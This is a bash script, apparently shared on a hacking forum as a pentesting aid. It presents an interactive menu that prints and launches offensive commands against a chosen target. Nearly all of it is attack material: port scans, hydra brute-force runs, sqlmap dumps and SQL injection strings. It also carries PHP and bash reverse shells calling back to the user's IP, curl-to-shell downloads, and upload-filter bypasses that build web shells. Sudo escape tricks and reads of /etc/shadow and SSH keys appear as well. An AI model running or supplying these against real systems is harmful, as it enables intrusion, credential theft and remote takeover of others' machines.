#!/bin/bash
#This script is for pentesting/learning security practices.
#Contact me here: https://hackforums.net/member.php?action=profile&uid=2682887

clear
##Enter website target and it defines it as $T
read -p "Enter Target Site (IP or Website.com with no trailing forward slash): " "T"

if [ -z "$T" ]; then
  T="127.0.0.1"
fi

devices=("tun0" "eth0" "ens33" "eth1")
for device in "${devices[@]}"; do
  myip=$(ifconfig $device | awk '/inet / {print $2}')
  if [[ "$myip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "The IP address is $myip"
    break
  fi
done

if [ -z "$myip" ]; then
  interfaces=$(ifconfig -s | awk '{print $1}' | grep -E '^enp.*')
  for interface in $interfaces; do
    myip=$(ifconfig $interface | awk '/inet / {print $2}')
    if [[ "$myip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
      echo "The IP address is $myip"
      break
    fi
  done
fi

if [ -z "$myip" ]; then
  myip=$(curl -s ifconfig.me)
  if [[ "$myip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "The IP address is $myip"
  else
    echo "myip"
  fi
fi

clear

  if ! command -v gnome-terminal >/dev/null 2>&1; then
    export gnome=$(echo "Shell wont work until you run: sudo apt-get install gnome-terminal")
  else
    :
  fi

function menu {
  clear
  echo $gnome
  echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀"
  echo "⠀⠀⠀⠀⢀⠀⠀⠀⠊⣉⡉⠄⠀⠀⠀⠀⠀⠀⠀"
  echo "⠀⠀⠀⠠⠂⠀⣀⠠⡀⠈⠀⡀⠀⠀⠂⠄⠀⢀⠀"
  echo "⠀⠁⠉⠉⠁⠀⠀⠀⠌⠉⠙⠀⠀⠀⠐⠉⠉⠀⠃"
  echo "⠀⢇⠈⠉⠀⠂⠀⠀⠀⠉⠁⡀⠀⠀⠇⠈⠉⠀⠂"
  echo "⠈⢀⠒⠒⠊⠀⠉Welcome⠁⠐⠒⠒⠂⠂"
  echo "⠀⠆⠘⠙⠀⠀⠀⠀To the⠀⠆⠘⠛⢈⠀"
  echo "⠀⠈⠖⠒⠂ Simulation⠒⠒⠂⠄"
  echo "⠀⡆⠐⠒⠀⠄⠀⠀⠀⠒⠂⠀⠀⠀⡆⠐⠒⠀⠄"
  echo "⠐⡈⠤⠤⠔⠀⠒⠀⡢⠤⠤⠁⠒⠂⠠⠤⠤⠄⠄"
  echo "⠀⠀⠀⠈⠄⠀⠀⠐⠀⠶⠆⠡⠀⠀⠄⠂⠀⠀⠀"
  echo "⠀⠀⠀⠀⠀⠀⠀⠂⠄⠀⠀⠂⠁⠀⠀⠀⠀⠀⠀"
  echo "⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀"
  echo "Remember to ALWAYS check for each service on each subdomain. Also check all directories on different ports. This script does not autofill the ports you find"
  echo -e "\033[35mScript will default to Tun0 OpenVPN IP for you and add it to commands otherwise tries Public IP, then IPv4 if that fails.\033[0m"
  echo -e "\033[1mRobot's Ultra Special Hacking Cheatsheet\033[0m - \033[31mSometimes you just need a reminder of where to look next.\033[0m"
  echo -e "Your IP $myip | Your target $T"
  echo -e "\033[32m(0) Manually input your IP and Target IP to change the script variables.\033[0m"
  echo -e "\033[32m(1) Port Scan Commands\033[0m"
  echo -e "\033[32m(2) Subdomain Scan Commands\033[0m"
  echo -e "\033[32m(3) CMS checking Commands\033[0m"
  echo -e "\033[32m(4) Directory checking commands\033[0m"
  echo -e "\033[32m(5) Host a local folder\033[0m"
  echo -e "\033[32m(6) Wordpress scanning\033[0m"
  echo -e "\033[32m(7) Common files to check\033[0m"
  echo -e "\033[32m(8) SQL injection\033[0m"
  echo -e "\033[32m(9) SMB tools\033[0m"
  echo -e "\033[32m(10) Hydra bruteforcing\033[0m"
  echo -e "\033[32m(11) Netcat Listener\033[0m"
  echo -e "\033[32m(12) PHP reverse shell\033[0m"
  echo -e "\033[32m(13) SSH/ID_RSA how to\033[0m"
  echo -e "\033[32m(14) FTP Stuff\033[0m"
  echo -e "\033[32m(15) DNS/Dig stuff\033[0m"
  echo -e "\033[32m(16) Privelege Escalation Commons\033[0m"
  echo -e "\033[32m(17) File upload bypasses\033[0m"
  echo -e "\033[32m(18) DNS Zone Transfers\033[0m"
  echo -e "\033[32m(19) Common SQL Injections\033[0m"
  echo -e "\033[32m(20) Cracking files/hashes\033[0m"
  echo -e "\033[32m(shell) Open a new terminal\033[0m"
  echo -e "\033[32m(exit) ... Obviously to exit\033[0m"
  echo -e "\033[32m(99) Helpful commands to remember\033[0m"
  echo "Enter your selection: "
  read selection
  clear
  case $selection in
    0)
      read -p "Enter Target Site (IP or Website.com with no trailing forward slash) Current target: $T: " "T"
      read -p "Enter Your IP to use (Current IP: $myip): " "myip"
      ;;
    1)
      rustscan="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
      nmap1="nmap -sC -sV $T -p 80,443,9090"
      nmap2="nmap -vv -Pn -A -sC -sS -T 4 -p- $T"
      nmap3="nmap -v -sS -A -T4 $T"
      nmap4="nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 $T"
      nmap5="nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $T"
      nmap6="nmap -sV -Pn -vv $T -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
      echo -e "\033[34mRustscan can be used for quick port scanning\033[0m"
      echo "(rustscan) $rustscan"
      echo -e "\033[34mThen we can pipe it into nmap with the ports we found for futher information where the ports are what we found from rustscan\033[0m"
      echo "(nmap1) $nmap1"
      echo -e "\033[34mGeneral Enumeration:\033[0m"
      echo "(nmap2) $nmap2"
      echo -e "\033[34mVerbose, syn, all ports, all scripts, no ping\033[0m"
      echo "(nmap3) $nmap3"
      echo ""
      echo -e "\033[34mVerbose, SYN Stealth, Version info, and scripts against services.\033[0m"
      echo "(nmap4) $nmap4"
      echo ""
      echo -e "\033[34mSMTP Enumeration\033[0m"
      echo "(nmap5) $nmap5"
      echo ""
      echo -e "\033[34mMySQL Enumeration\033[0m"
      echo "(nmap6) $nmap6"
      ;;
    2)
      wfuzz="wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.$site\" http://$site"
      echo -e "\033[34mWe can use wfuzz to try and find subdomains if we have found a domain name or vhost such as website.com\033[0m"
      echo "(wfuzz) $wfuzz"
      ;;
    3)
      whatweb="whatweb $T"
      httpx="/usr/local/bin/httpx -status-code -title -tech-detect $T -p 8080,443,80,9999 2>&1"
      echo -e "\033[34mWe can use whatweb or httpx to check what a subdomain, subfolder or domain is hosting including version numbers\033[0m"
      echo "(whatweb) $whatweb"
      echo "(httpx) $httpx"
      ;;
    4)
      dirsearch="dirsearch -u $T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie=$cookie --exclude-subdirs=js,css"
      echo -e "\033[34mIf you have logged into the site, make sure to run it with cookies using --cookies= to possible find more results\033[0m"
      echo "(dirsearch) $dirsearch"
      ;;
    5)
      host="python3 -m http.server 80"
      echo -e "\033[34mTo host a local folder make sure you are in that folder within the terminal you run this command\033[0m"
      echo "(host) $host"
      ;;
    6)
      wpscan="wpscan --url http://$T --enumerate u,vp,vt"
      echo -e "\033[34mWordpress scanning is easy, if you have an API key from wpscan.com use the api-token parameter --api-token=\033[0m"
      echo "(wpscan) $wpscan"
      ;;
    7)
      echo -e "\033[34mJust a reminder of common folder/files to check\033[0m"
      echo "/robots.txt /crossdomain.xml /clientaccesspolicy.xml /phpinfo.php /sitemap.xml /.git"
      ;;
    8)
      sqlmap="sqlmap -u \"https://$T/index.php?m=Index\" --level 5 --risk 3 --dump"
      echo -e "\033[34mIf you find fields that look like they might be injected with post data in the URL - also check for post data in burp\033[0m"
      echo "(sqlmap) $sqlmap"
      ;;
    9)
      echo -e "\033[34mCommon SMB commands\033[0m"
      smbclient="smbclient -L //$T -U \"\""
      smbmap="smbmap -H $T"
      showmount="showmount -e $T"
      ifshowmount="#If showmount works"
      mount="mount $T:/vol/share /mnt/nfs  -nolock"
      smbget="smbget -R smb://$T/anonymous"
      nmblookup="nmblookup -A $T"
      echo "(smbclient) $smbclient"
      echo "(smbmap) $smbmap"
      echo "(showmount) $showmount"
      echo "$ifshowmount"
      echo "(mount) $mount"
      echo "(smbget) $smbget"
      echo "(nmblookup) $nmblookup"
      ;;
    10)
      hydraftp="hydra -l root -P passwords.txt -t 32 $T ftp"
      hydramysql="hydra -L usernames.txt -P pass.txt $T mysql"
      hydrardp="hydra -V -f -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://$T"
      hydrasmb="hydra -l Administrator -P words.txt $T smb -t 1"
      hydrasmtp="hydra -l root -P /usr/share/wordlists/rockyou.txt $T smtp -V"
      hydrassh="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T ssh"
      hydratelnet="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T telnet"
      hydravnc="hydra -L /root/Desktop/usernames.txt –P /root/Desktop/pass.txt -s <PORT> $T vnc"
      echo -e "\033[34mCommon hydra commands\033[0m"
      echo "(hydraftp) $hydraftp"
      echo "(hydramysql) $hydramysql"
      echo "(hydrasmb) $hydrasmb"
      echo "(hydrasmtp) $hydrasmtp"
      echo "(hydrassh) $hydrassh"
      echo "(hydratelnet) $hydratelnet"
      echo "(hydravnc) $hydravnc"
      ;;
    11)
      netcat="nc -lvnp 1234"
      echo -e "\033[34mNetcat is helpful\033[0m"
      echo "(netcat) $netcat"
      ;;
    12)
      echo -e "\033[34mPHP reverse shell\033[0m"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);\`/bin/sh -i <&3 >&3 2>&3\`;'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
      echo "php -r '\$sock=fsockopen(\"$myip\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
      ;;
    13)
      echo -e "\033[34mSSH id_rsa file?\033[0m"
      echo "chmod 400 id_rsa"
      echo "/usr/share/john/ssh2john.py id_rsa > id_rsa.john"
      echo "john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john"
      echo "ssh -i id_rsa username@$T -p 22"
      ;;
    14)
      wget="wget -m ftp://anonymous:anonymous@$T"
      nmapftp="nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $T"
      echo -e "\033[34mFTP Stuff\033[0m"
      echo "(wget) $wget"
      echo "(nmapftp) $nmapftp"
      ;;
    15)
      dig="dig $T"
      echo -e "\033[34mDig for DNS stuff\033[0m"
      echo "(dig) $dig"
      ;;
    16)
      echo -e "\033[34mFind SUID files\033[0m"
      echo "find / -perm -u=s -type f 2>/dev/null"
      echo ""
      echo -e "\033[34mLocate the SUID root file\033[0m"
      echo "find / -user root -perm -4000 -print"
      echo ""
      echo -e "\033[34mLocate the SGID root file\033[0m"
      echo "find / -group root -perm -2000 -print"
      echo ""
      echo -e "\033[34mLocate the SUID and SGID files:\033[0m"
      echo "find / -perm -4000 -o -perm -2000 -print"
      echo ""
      echo -e "\033[34mFind files that do not belong to any user:\033[0m"
      echo "find / -nouser -print"
      echo ""
      echo -e "\033[34mLocate a file that does not belong to any user group:\033[0m"
      echo "find / -nogroup -print"
      echo ""
      echo "curl -L $myip/linpeas.sh | sh"
      echo ""
      echo "wget $myip/linpeas.sh"
      echo ""
      echo "crontab -e"
      echo ""
      echo -e "\033[34mPython to bash shell\033[0m"
      echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
      echo ""
      echo -e "\033[34mRemember to check https://gtfobins.github.io/\033[0m"
      ;;
    17)
      echo -e "\033[34mDownloading php reverse shell and creating a bunch of variants to try uploading\033[0m"
      echo -e "\033[34mRemember to use burpsuite when trying to bypass file upload fields.\033[0m"
      echo -e "\033[34mThis section will create a few variants to bypass upload filters\033[0m"
      echo -e "\033[34mCopy paste from mkdir to the last echo line so you can find where they are created.\033[0m"
      echo "mkdir phpreverseshell"
      echo "wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -P phpreverseshell/"
      echo "sed -i \"s/127.0.0.1/$myip/\" phpreverseshell/php-reverse-shell.php"
      echo "echo 'GIF89a;' | cat - phpreverseshell/php-reverse-shell.php > temp && mv temp phpreverseshell/php-reverse-shell.php"
      echo "cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.png"
      echo "cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.jpg"
      echo "export directory=$(pwd)"
      echo "clear"
      echo "echo Your shells will be located in \$directory/phpreverseshell/ with the reverse connection IP $myip"
      echo ""
      echo -e "\033[34mNow we will create an exif variant/lfi variant. When uploaded use Tux.jpg?cmd=whoami\033[0m"
      echo "wget https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg -P phpreverseshell/"
      echo "exiftool -Comment='<?php echo \"<pre>\"; system(\$_GET['cmd']); ?>' phpreverseshell/Tux.jpg"
      echo "mv phpreverseshell/Tux.jpg phpreverseshell/Tux.php.jpg"
      echo ""
      echo -e "\033[34mMake sure to replace (Content-type: application/x-php) with (Content-type: image/jpeg) using burpsuite)\033[0m"
      echo ""
      echo -e "\033[34mUploading file via CURL if the PUT option is available:\033[0m"
      echo "curl --upload-file phpreverseshell/php-reverse-shell.php --url http://$T/test/shell.php --http1.0"
      ;;
    18)
      dnsrecon="dnsrecon -d $T -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml"
      echo -e "\033[34mDNS Zone Transfers\033[0m"
      echo "(dnsrecon) $dnsrecon"
      ;;
    19)
      echo -e "\033[34mCommon SQL Injections\033[0m"
      echo "admin' --"
      echo "admin' #"
      echo "admin'/*"
      echo "' or 1=1--"
      echo "' or 1=1#"
      echo "' or 1=1/*"
      echo "') or '1'='1--"
      echo "') or ('1'='1—"
      ;;
    20)
      echo -e "\033[34mPassword cracking hashes/files\033[0m"
      echo ""
      echo -e "\033[34mHashcracking with hashcat\033[0m"
      echo "hashcat -m 400 -a 0 hash.txt /root/rockyou.txt"
      echo ""
      echo -e "\033[34mCracking the password for an image file\033[0m"
      echo "stegseek file.jpg"
      echo ""
      echo -e "\033[34mCrack zip file password\033[0m"
      echo "sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip"
      ;;
    99)
      echo -e "\033[34mEnumerating SNMP\033[0m"
      snmpget="snmpget -v 1 -c public $T"
      snmpwalk="snmpwalk -v 1 -c public $T"
      snmpbulkwalk="snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
      echo "(snmpget) $snmpget"
      echo "(snmpwalk) $snmpwalk"
      echo "(snmpbulkwalk) $snmpbulkwalk"
      echo ""
      echo -e "\033[34mFind processes running\033[0m"
      echo "ps aux"
      echo ""
      echo -e "\033[34mFinding Exif data on a file\033[0m"
      echo "exiftool file.jpg"
      echo ""
      echo -e "\033[34mCompiling Exploits\033[0m"
      echo "gcc -o exploit exploit.c"
      echo ""
      echo -e "\033[34mCompile .exe on linux\033[0m"
      echo "i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe"
      ;;
    shell)
      gnome-terminal -- bash -c "echo fresh terminal; bash"
      menu
      ;;
    exit)
      exit
      ;;
    1337)
      echo "You found the secret checklist menu!"
      echo "This is still a work in progress. Stay tuned."
      ;;
    *)
      echo -e "\033[31mInvalid option. Please try again.\033[0m"
      ;;
  esac
}

while true; do
  menu
  echo ""
  read -p "Enter the number of the command you want to run or type 'exit' to quit, or type 'shell' to open a new terminal: " input
  if [ "$input" == "exit" ]; then
    break
  elif [ "$input" == "shell" ]; then
    gnome-terminal -- bash -c "echo fresh terminal; bash"
    continue
  elif [ "$input" == "rustscan" ]; then
    gnome-terminal -- bash -c "echo 'running $rustscan'; $rustscan; bash"
    continue
  elif [ "$input" == "nmap1" ]; then
    gnome-terminal -- bash -c "echo 'running $nmap1'; $nmap1; bash"
    continue
  elif [ "$input" == "nmap2" ]; then
    gnome-terminal -- bash -c "echo 'running $nmap2'; $nmap2; bash"
    continue
  elif [ "$input" == "nmap3" ]; then
    gnome-terminal -- bash -c "echo 'running $nmap3'; $nmap3; bash"
    continue
  elif [ "$input" == "nmap4" ]; then
    gnome-terminal -- bash -c "echo 'running $nmap4'; $nmap4; bash"
    continue
  elif [ "$input" == "nmap5" ]; then
    gnome-terminal -- bash -c "echo 'running $nmap5'; $nmap5; bash"
    continue
  elif [ "$input" == "nmap6" ]; then
    gnome-terminal -- bash -c "echo 'running $nmap6'; $nmap6; bash"
    continue
  elif [ "$input" == "wfuzz" ]; then
    gnome-terminal -- bash -c "echo 'running $wfuzz'; $wfuzz; bash"
    continue
  elif [ "$input" == "whatweb" ]; then
    gnome-terminal -- bash -c "echo 'running $whatweb'; $whatweb; bash"
    continue
  elif [ "$input" == "httpx" ]; then
    gnome-terminal -- bash -c "echo 'running httpx'; $httpx; bash"
    continue
  elif [ "$input" == "dirsearch" ]; then
    gnome-terminal -- bash -c "echo 'running $dirsearch'; $dirsearch; bash"
    continue
  elif [ "$input" == "host" ]; then
    gnome-terminal -- bash -c "echo 'running $host'; $host; bash"
    continue
  elif [ "$input" == "wpscan" ]; then
    gnome-terminal -- bash -c "echo 'running $wpscan'; $wpscan; bash"
    continue
  elif [ "$input" == "sqlmap" ]; then
    gnome-terminal -- bash -c "echo 'running $sqlmap'; $sqlmap; bash"
    continue
  elif [ "$input" == "smbclient" ]; then
    gnome-terminal -- bash -c "echo 'running $rustscan'; $rustscan; bash"
    continue
  elif [ "$input" == "smbmap" ]; then
    gnome-terminal -- bash -c "echo 'running $smbmap'; $smbmap; bash"
    continue
  elif [ "$input" == "showmount" ]; then
    gnome-terminal -- bash -c "echo 'running $showmount'; $showmount; bash"
    continue
  elif [ "$input" == "mount" ]; then
    gnome-terminal -- bash -c "echo 'running $mount'; $mount; bash"
    continue
  elif [ "$input" == "smbget" ]; then
    gnome-terminal -- bash -c "echo 'running $smbget'; $smbget; bash"
    continue
  elif [ "$input" == "nmblookup" ]; then
    gnome-terminal -- bash -c "echo 'running $nmblookup'; $nmblookup; bash"
    continue
  elif [ "$input" == "hydraftp" ]; then
    gnome-terminal -- bash -c "echo 'running $hydraftp'; $hydraftp; bash"
    continue
  elif [ "$input" == "hydramysql" ]; then
    gnome-terminal -- bash -c "echo 'running $rustscan'; $rustscan; bash"
    continue
  elif [ "$input" == "hydrardp" ]; then
    gnome-terminal -- bash -c "echo 'running $hydrardp'; $hydrardp; bash"
    continue
  elif [ "$input" == "hydrasmb" ]; then
    gnome-terminal -- bash -c "echo 'running $hydrasmb'; $hydrasmb; bash"
    continue
  elif [ "$input" == "hydrasmtp" ]; then
    gnome-terminal -- bash -c "echo 'running $hydrasmtp'; $hydrasmtp; bash"
    continue
  elif [ "$input" == "hydrassh" ]; then
    gnome-terminal -- bash -c "echo 'running $hydrassh'; $hydrassh; bash"
    continue
  elif [ "$input" == "hydratelnet" ]; then
    gnome-terminal -- bash -c "echo 'running $hydratelnet'; $hydratelnet; bash"
    continue
  elif [ "$input" == "hydravnc" ]; then
    gnome-terminal -- bash -c "echo 'running $hydravnc'; $hydravnc; bash"
    continue
  elif [ "$input" == "netcat" ]; then
    gnome-terminal -- bash -c "echo 'running $netcat'; $netcat; bash"
    continue
  elif [ "$input" == "wget" ]; then
    gnome-terminal -- bash -c "echo 'running $wget'; $wget; bash"
    continue
  elif [ "$input" == "nmapftp" ]; then
    gnome-terminal -- bash -c "echo 'running $nmapftp'; $nmapftp; bash"
    continue
  elif [ "$input" == "dig" ]; then
    gnome-terminal -- bash -c "echo 'running $dig'; $dig; bash"
    continue
  elif [ "$input" == "dnsrecon" ]; then
    gnome-terminal -- bash -c "echo 'running $dnsrecon'; $dnsrecon; bash"
    continue
  elif [ "$input" == "snmpget" ]; then
    gnome-terminal -- bash -c "echo 'running $snmpget'; $snmpget; bash"
    continue
  elif [ "$input" == "snmpwalk" ]; then
    gnome-terminal -- bash -c "echo 'running $snmpwalk'; $snmpwalk; bash"
    continue
  elif [ "$input" == "snmpbulkwalk" ]; then
    gnome-terminal -- bash -c "echo 'running $snmpbulkwalk'; $snmpbulkwalk; bash"
    continue
  fi
done

#Commands to add
#find / -name id_rsa 2> /dev/null
#find / -name authorized_keys 2> /dev/null
#cat ~/.bash_history
#a. sudo find /bin -name nano -exec /bin/sh \;
#b. sudo awk 'BEGIN {system("/bin/sh")}'
#c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
#d. sudo vim -c '!sh'
#e. sudo apache2 -f /etc/shadow
#find / -type f -perm -04000 -ls 2>/dev/null
#strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
#getcap -r / 2>/dev/null
#gobuster  dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://<ip>:8081/ -x php,txt,html,sh,cgi
#Test api endpoints for breakouts: /ping?ip=google.com | `ls`
#bash -i >& /dev/tcp/$myip/4444 0>&1
